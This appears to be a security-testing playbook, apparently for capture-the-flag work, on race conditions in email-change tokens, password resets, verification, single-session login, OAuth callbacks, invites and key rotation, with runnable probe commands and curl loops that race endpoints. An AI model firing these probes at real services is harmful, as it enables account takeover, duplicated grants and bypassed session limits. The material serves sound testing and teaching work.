# Per-check playbook — token delivery, email change, verification, session

The token-and-identity playbooks. The window here is between *minting* a value
and *binding* it to an identity — the ApexSurvive shape.

---

## 1. Email/phone change + verification token (the ApexSurvive shape)

### The window

```text
POST /profile {email}
  → generate token T for the new email        -- mint
  → UPDATE profile SET email=?, token=T        -- commit the email change
  → read profile.email                          -- RE-READ in another function
  → sendEmail(profile.email, T)                -- bind/send, outside the txn
```

Token generation and the address read are not atomic. An interleaved second
update lands between the commit and the re-read:

```text
A: update email=a@x, mint Ta, commit
B: update email=b@y, mint Tb, commit     ← lands before A re-reads
A: re-reads email → gets b@y             ← crossed
A: sendEmail(b@y, Ta)                    ← Ta delivered to B's mailbox
```

### The serial-impossible outcome

The token minted for address A arrives at address B — you read B's mailbox
(e.g. a catch-all domain you control) and confirm A's pending change.

### Probes

```bash
# needs interleave, not burst — A and B are different requests
python3 tools/web/race_probe.py \
  --url "$BASE/profile"  --method POST --body '{"email":"a@yourdomain"}' -H 'Cookie: session=...' \
  --url-b "$BASE/profile" --method-b POST --body-b '{"email":"b@yourdomain"}' \
  --concurrency 2 --count 10 --baseline-count 4 \
  --signature-mode normalized-body --write-ack --challenge <name>
```

Or the manual stall — withhold A's last body byte while B completes (see
`delivery-mechanics.md` §1).

The observable is in the mailbox, not the response: check which address got
which token. Repeat until the cross appears; a `max_in_flight` of 1 means the
pair never overlapped — inconclusive, re-roll.

### Falsifier

Each token reaches only its own address on every ordering — mint and send read
the same committed row inside one transaction. Record it and stop; do not
raise the rate.

## 2. Password-reset token issue

### The window

```text
POST /reset {email}
  → invalidate old token                        -- read/delete
  → mint new token T, store                     -- write
  → sendEmail(email, T)                         -- outside the txn
```

Two interleaved resets can produce: both emails sent but only the last-stored
token valid (normal), or — the interesting one — token T_a stored while
email carries T_b, or a stale token that stays valid because the invalidate
ran before the other request's store.

### The serial-impossible outcome

Two *different* valid tokens for one account alive at once, where the contract
is "only the latest works". Confirm by using both.

### Probes

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/api/reset" --method POST --body '{"email":"you@yourdomain"}' \
  -H 'Cookie: session=...' \
  --concurrency 4 --count 4 --baseline-count 2 \
  --signature-mode normalized-body --write-ack --challenge <name>
# collect the tokens from the mailbox, try each:
for t in $TOKENS; do curl -s -o /dev/null -w "$t %{http_code}\n" \
  -X POST "$BASE/api/reset/confirm" -d "{\"token\":\"$t\",\"password\":\"x\"}"; done
```

## 3. Email/phone *verification* consume

### The window

```text
POST /verify {token}
  → SELECT token row, check unused              -- read
  → UPDATE user SET verified=1                  -- act
  → UPDATE token SET used=1                     -- write
```

Two interleaved verifies of the same token both mark the user verified — the
harmless form. The useful form is when verify also *grants* something
(credits, a role, a trial): two grants.

### The serial-impossible outcome

Two grant effects for one token — same probe shape as the redeem playbook;
count the effects, not the 200s.

## 4. Session issue-once / single-session policy

### The window

```text
POST /login
  → check password                              -- read user
  → SELECT active_session WHERE user=?          -- read session
  → if none: INSERT session                     -- write
```

A "one active session" policy raced produces two live sessions — confirm by
using both cookies.

```bash
python3 tools/web/race_probe.py --url "$BASE/api/login" \
  --method POST --body '{"user":"me","pass":"mine"}' \
  --concurrency 4 --count 4 --baseline-count 2 \
  --signature-mode raw-body --write-ack --challenge <name>
# harvest Set-Cookie from each 200; a second distinct cookie that also works
# is the crossed state.
```

## 5. Registration-vs-activation (the SSOS primitive)

### The window

The bot's startup does `registerUser(fixed account)` — a check-then-insert.
If you insert first, the bot's own register fails but its later steps keep
running against the account you now own.

### The probe

Hammer the register endpoint for the fixed account before the bot reaches its
step — a timing race against startup, not a request pair:

```bash
for i in $(seq 1 60); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$BASE/api/register" \
    -H 'Content-Type: application/json' \
    -d '{"email":"student@domain","password":"yours"}' &
done; wait
curl -s -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  -d '{"email":"student@domain","password":"yours"}'   # works = you won
```

### Falsifier / blast radius

The account is already registered with an unknown random password — the
instance is consumed and unrecoverable; only a fresh instance can be won.
Confirm the instance is fresh first; this race is one-shot.

## 6. OAuth state / nonce consume

### The window

```text
GET /callback?code=...&state=...
  → read state from session store               -- read
  → if matches: exchange code, delete state      -- act + write
```

Two callbacks with the same `state`/`code` pair can both pass the check before
either deletes it — two token exchanges for one auth code. Some providers
invalidate the code on first exchange (safe), others accept it twice.

### Probe

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/oauth/callback?code=$CODE&state=$STATE" \
  --concurrency 4 --count 4 --baseline-count 2 \
  --signature-mode normalized-body --challenge <name>
```

Two `200`s carrying two session grants is the crossed state; the second
getting `invalid_grant` is the falsifier.

## 7. Invite / referral claim

```text
POST /invite/accept {code}
  → SELECT uses FROM invites WHERE code=?        -- read
  → if uses < max: create member, uses += 1      -- act + write
```

Burst-accept a `max_uses=1` invite with two accounts; both memberships created
is the crossed state. Same probe, `--url-b` to send the second account's
session.

## 8. API-key / token rotation

```text
POST /keys/rotate
  → SELECT current key                           -- read
  → mint new, UPDATE key, invalidate old         -- write
```

Interleaved rotations can leave the *old* key valid (the second rotation's
"invalidate old" ran before the first's "store new") — test whether the
superseded key still authenticates after a raced rotation.
